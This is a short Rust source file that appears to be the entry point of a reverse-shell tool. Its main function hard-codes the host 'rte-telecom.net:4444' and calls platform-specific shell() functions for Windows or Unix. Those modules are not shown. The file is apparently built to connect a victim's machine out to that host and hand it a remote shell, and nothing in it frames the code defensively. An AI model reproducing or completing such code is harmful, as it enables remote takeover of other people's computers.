#[cfg(windows)] mod win32;
#[cfg(not(windows))] mod unix;
fn main() {
    let host = "rte-telecom.net:4444";
    
    #[cfg(windows)] win32::shell(host);
    #[cfg(not(windows))] unix::shell(host);
}
